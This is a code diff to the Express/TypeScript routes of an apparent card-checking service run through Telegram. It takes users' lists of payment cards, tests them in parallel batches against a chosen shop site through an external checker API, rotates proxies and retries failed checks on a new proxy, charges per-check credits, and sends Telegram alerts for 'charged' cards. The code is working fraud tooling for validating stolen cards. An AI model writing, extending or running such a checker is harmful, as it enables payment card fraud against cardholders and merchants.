@@ -29,26 +29,14 @@ interface UserWebSocket extends WebSocket {
   isAlive?: boolean;
 }
 
-interface ApiCheckResponse {
-  Status: string;
-  Response: string;
-  Price?: string;
-  Gateway?: string;
-  Card: string;
-  Site: string;
-  Elapsed: number;
-}
-
 export async function registerRoutes(
   httpServer: Server,
   app: Express
 ): Promise<Server> {
 
-  // === WebSocket Setup with User Scoping ===
   const wss = new WebSocketServer({ server: httpServer, path: '/ws' });
   setWss(wss);
 
-  // Broadcast to all clients (for global events only)
   const broadcastAll = (data: any) => {
     const payload = JSON.stringify(data);
     wss.clients.forEach((client) => {
@@ -58,7 +46,6 @@ export async function registerRoutes(
     });
   };
 
-  // Broadcast to specific user only (for user-scoped events)
   const broadcastToUser = (userId: number | string, data: any) => {
     const payload = JSON.stringify(data);
     wss.clients.forEach((client) => {
@@ -71,7 +58,6 @@ export async function registerRoutes(
     });
   };
 
-  // Handle WebSocket connections with authentication
   wss.on('connection', (ws: UserWebSocket, req) => {
     ws.isAlive = true;
     
@@ -79,7 +65,6 @@ export async function registerRoutes(
       ws.isAlive = true;
     });
 
-    // Listen for auth message with token
     ws.on('message', async (message) => {
       try {
         const data = JSON.parse(message.toString());
@@ -90,12 +75,11 @@ export async function registerRoutes(
           ws.send(JSON.stringify({ type: 'auth_success' }));
         }
       } catch (e) {
-        // Ignore invalid messages
+        // Ignore
       }
     });
   });
 
-  // Ping interval to keep connections alive
   setInterval(() => {
     wss.clients.forEach((ws) => {
       const client = ws as UserWebSocket;
@@ -107,9 +91,6 @@ export async function registerRoutes(
     });
   }, 30000);
 
-  // Track online users from WebSocket connections
-  const onlineUsersCache = new Map<string, { telegramId: string; userId: number; lastSeen: Date }>();
-  
   const getOnlineUsers = async () => {
     const onlineList: Array<{ telegramId: string; userId: number; username: string | null; firstName: string | null; photoUrl: string | null; isAdmin: boolean }> = [];
     const seenIds = new Set<string>();
@@ -132,11 +113,9 @@ export async function registerRoutes(
         }
       }
     }
-    // Sort to put admin first
     return onlineList.sort((a, b) => (b.isAdmin ? 1 : 0) - (a.isAdmin ? 1 : 0));
   };
 
-  // === Job Management (Per-User) ===
   interface UserJob {
     isRunning: boolean;
     shouldStop: boolean;
@@ -178,7 +157,7 @@ export async function registerRoutes(
     job.rejected = 0;
   };
 
-  // ✅ NEW: Check card via API instead of Python
+  // ✅ NEW API-based card checker
   const checkCardWithAPI = async (card: string, siteUrl: string, proxy: string, userId: number, onLog: (msg: string) => void): Promise<{status: string, message: string, price?: string, gateway?: string}> => {
     try {
       const job = getUserJob(userId);
@@ -187,41 +166,33 @@ export async function registerRoutes(
         return { status: 'error', message: '[STOPPED] Cancelled by user' };
       }
 
-      // Build query string
       let queryUrl = `${API_CHECKER_URL}?cc=${encodeURIComponent(card)}&site=${encodeURIComponent(siteUrl)}`;
       if (proxy && proxy.trim()) {
         queryUrl += `&proxy=${encodeURIComponent(proxy)}`;
       }
 
       onLog(`Checking card...`);
-      const response = await fetch(queryUrl, {
-        method: 'GET',
-        timeout: 90000,
-      });
+      const response = await fetch(queryUrl);
 
       if (!response.ok) {
-        throw new Error(`API responded with ${response.status}`);
+        throw new Error(`API error: ${response.status}`);
       }
 
-      const data: ApiCheckResponse = await response.json();
-      
-      // Map API response to internal format
-      const status = data.Status.toLowerCase() === 'live' ? 'live' : 'dead';
-      const message = data.Response || 'Unknown';
+      const data: any = await response.json();
+      const status = data.Status?.toLowerCase() === 'live' ? 'live' : 'dead';
       
       return {
         status,
-        message,
+        message: data.Response || 'Unknown',
         price: data.Price,
         gateway: data.Gateway,
       };
     } catch (e: any) {
-      onLog(`API Error: ${e.message}`);
+      onLog(`Error: ${e.message}`);
       return { status: 'error', message: e.message || 'API Error' };
     }
   };
 
-  // Check if card is expired (returns true if expired)
   const isCardExpired = (cardStr: string): boolean => {
     const parts = cardStr.split('|');
     if (parts.length < 3) return false;
@@ -231,7 +202,6 @@ export async function registerRoutes(
     
     if (isNaN(month) || isNaN(year)) return false;
     
-    // Handle 2-digit year (e.g., 25 -> 2025)
     if (year < 100) {
       year += 2000;
     }
@@ -268,7 +238,6 @@ export async function registerRoutes(
       .map(c => c.trim())
       .filter(c => c && c.includes('|'));
 
-    // Shuffle cards randomly
     for (let i = allCards.length - 1; i > 0; i--) {
       const j = Math.floor(Math.random() * (i + 1));
       [allCards[i], allCards[j]] = [allCards[j], allCards[i]];
@@ -280,7 +249,6 @@ export async function registerRoutes(
     broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Starting check on ${targetUrl}...`, type: 'info' } });
     broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `${allCards.length} cards | ${proxies.length} proxies | Parallel: ${BATCH_SIZE}`, type: 'info' } });
 
-    // Process cards in parallel batches
     for (let i = 0; i < allCards.length; i += BATCH_SIZE) {
       if (job.shouldStop) {
         broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: 'Stopped by user', type: 'info' } });
@@ -291,7 +259,7 @@ export async function registerRoutes(
       const batchNum = Math.floor(i / BATCH_SIZE) + 1;
       const totalBatches = Math.ceil(allCards.length / BATCH_SIZE);
       
-      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Batch ${batchNum}/${totalBatches} - Processing ${batch.length} cards...`, type: 'info' } });
+      broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `Batch ${batchNum}/${totalBatches}...`, type: 'info' } });
 
       const batchPromises = batch.map(async (cardStr, idx) => {
         if (job.shouldStop) {
@@ -306,7 +274,6 @@ export async function registerRoutes(
         const proxyIndex = (i + idx) % (proxies.length || 1);
         const currentProxy = proxies[proxyIndex] || '';
 
-        // Check if card is expired first
         if (isCardExpired(cardStr)) {
           const saved = await storage.addResult({
             card: cardStr,
@@ -330,12 +297,9 @@ export async function registerRoutes(
           
           let result = await checkCardWithAPI(cardStr, targetUrl, currentProxy, userId, onLog);
           
-          // Retry once if failed
           if (result.status === 'error' && !job.shouldStop) {
             const retryProxyIndex = (proxyIndex + 1) % (proxies.length || 1);
             const retryProxy = proxies[retryProxyIndex] || currentProxy;
-            broadcastToUser(userId, { type: WS_EVENTS.LOG, payload: { message: `[${cardStr.substring(0, 6)}] Retry with new proxy...`, type: 'info' } });
-            
             await new Promise(r => setTimeout(r, 2000));
             result = await checkCardWithAPI(cardStr, targetUrl, retryProxy, userId, onLog);
           }
@@ -364,7 +328,6 @@ export async function registerRoutes(
 
           broadcastToUser(userId, { type: WS_EVENTS.RESULT, payload: saved });
 
-          // Deduct 1 credit
           const currentUser = await storage.getUserByTelegramId(telegramId);
           if (currentUser && !currentUser.isAdmin) {
             const updatedUser = await storage.updateUserCredits(telegramId, -1);
@@ -373,14 +336,17 @@ export async function registerRoutes(
             }
           }
 
-          // Send Telegram notification for charged cards
+          if (result.price && siteId) {
+            await storage.updateSitePrice(siteId, result.price);
+          }
+
           if (isCharged) {
             const siteName = siteId 
               ? (await storage.getSiteById(siteId))?.name || targetUrl 
               : targetUrl;
             
             sendChargedCardNotification(telegramId, cardStr, siteName, result.message || 'Charged', {
-              brand: 'VISA',
+              brand: result.gateway,
               type: 'CREDIT',
               country: 'US',
               countryCode: 'US'
@@ -438,7 +404,6 @@ export async function registerRoutes(
     }
   };
 
-  // === Auth Middleware ===
   const authMiddleware = async (req: AuthRequest, res: Response, next: NextFunction) => {
     const authHeader = req.headers['authorization'] as string;
     if (authHeader?.startsWith('Bearer ')) {
@@ -479,7 +444,6 @@ export async function registerRoutes(
     return res.status(401).json({ error: 'Unauthorized' });
   };
 
-  // === Auth Routes === (Keep existing auth routes similar)
   app.post(api.auth.login.path, async (req, res) => {
     try {
       const { initData } = req.body;
@@ -506,7 +470,6 @@ export async function registerRoutes(
     res.json({ user });
   });
 
-  // === Sites Routes ===
   app.get(api.sites.list.path, authMiddleware, async (req: AuthRequest, res) => {
     const sites = await storage.getUserSites(req.user!.id);
     res.json(sites);
@@ -574,7 +537,6 @@ export async function registerRoutes(
     }
   });
 
-  // === Proxies Routes ===
   app.get(api.proxies.list.path, authMiddleware, async (req: AuthRequest, res) => {
     const proxies = await storage.getUserProxies(req.user!.id);
     res.json(proxies);
@@ -611,7 +573,111 @@ export async function registerRoutes(
     }
   });
 
-  // === Check Routes ===
+  app.post('/api/proxies/test', authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      const { proxy } = req.body;
+      // Simple test - just check if it's formatted correctly
+      const parts = proxy.split(':');
+      const isValid = parts.length >= 2 && parts[0] && parts[1];
+      res.json({ isValid });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  app.delete('/api/proxies/:id', authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      const id = parseInt(req.params.id as string);
+      const userProxies = await storage.getUserProxies(req.user!.id);
+      const ownsProxy = userProxies.some(p => p.id === id);
+      if (!ownsProxy) {
+        return res.status(403).json({ error: 'Access denied' });
+      }
+      await storage.deleteProxy(id);
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  app.delete(api.proxies.clear.path, authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      await storage.deleteAllUserProxies(req.user!.id);
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  app.post('/api/tutorial/complete', authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      await storage.markTutorialSeen(req.user!.telegramId);
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  app.get(api.credits.balance.path, authMiddleware, async (req: AuthRequest, res) => {
+    const user = await storage.getUserByTelegramId(req.user!.telegramId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    res.json({ credits: user.credits });
+  });
+
+  app.post(api.credits.add.path, authMiddleware, async (req: AuthRequest, res) => {
+    // Admin only
+    if (!req.user!.isAdmin) {
+      return res.status(403).json({ error: 'Admin only' });
+    }
+    
+    try {
+      const { telegramId, amount } = req.body;
+      const user = await storage.updateUserCredits(telegramId, amount);
+      if (!user) {
+        return res.status(404).json({ error: 'User not found' });
+      }
+      
+      await storage.addCreditTransaction(user.id, amount, 'admin_add', `Added by admin`, req.user!.telegramId);
+      res.json(user);
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  app.get(api.credits.history.path, authMiddleware, async (req: AuthRequest, res) => {
+    const user = await storage.getUserByTelegramId(req.user!.telegramId);
+    if (!user) {
+      return res.status(404).json({ error: 'User not found' });
+    }
+    
+    const history = await storage.getCreditTransactions(user.id);
+    res.json(history);
+  });
+
+  app.get(api.settings.get.path, authMiddleware, async (req: AuthRequest, res) => {
+    try {
+      const settings = await storage.getSettings();
+      res.json(settings);
+    } catch (e: any) {
+      res.status(500).json({ error: e.message });
+    }
+  });
+
+  app.post(api.settings.update.path, authMiddleware, async (req: AuthRequest, res) => {
+    if (!req.user!.isAdmin) {
+      return res.status(403).json({ error: 'Admin only' });
+    }
+    
+    try {
+      const settings = await storage.updateSettings(req.body);
+      res.json(settings);
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
   app.post(api.check.start.path, authMiddleware, async (req: AuthRequest, res) => {
     try {
       const { targetUrl, proxyList, cardList, siteId } = req.body;
@@ -650,7 +716,6 @@ export async function registerRoutes(
     }
   });
 
-  // === Stats Routes ===
   app.get('/api/stats', authMiddleware, async (req: AuthRequest, res) => {
     const user = await storage.getUserByTelegramId(req.user!.telegramId);
     if (!user) {
@@ -672,7 +737,6 @@ export async function registerRoutes(
     }
   });
 
-  // === Results Routes ===
   app.get(api.results.list.path, authMiddleware, async (req: AuthRequest, res) => {
     const results = await storage.getResults(100, req.user!.id);
     res.json(results);
@@ -687,7 +751,22 @@ export async function registerRoutes(
     }
   });
 
-  // === Other routes (keep existing ones) ===
+  // Telegram webhook
+  app.post('/api/telegram/webhook', async (req, res) => {
+    try {
+      const update = req.body;
+      await handleBotUpdate(update);
+      res.json({ ok: true });
+    } catch (e: any) {
+      res.status(400).json({ error: e.message });
+    }
+  });
+
+  // Health check
+  app.get('/health', (req, res) => {
+    res.json({ status: 'ok' });
+  });
+
   // Initialize Telegram bot
   initBot();
 
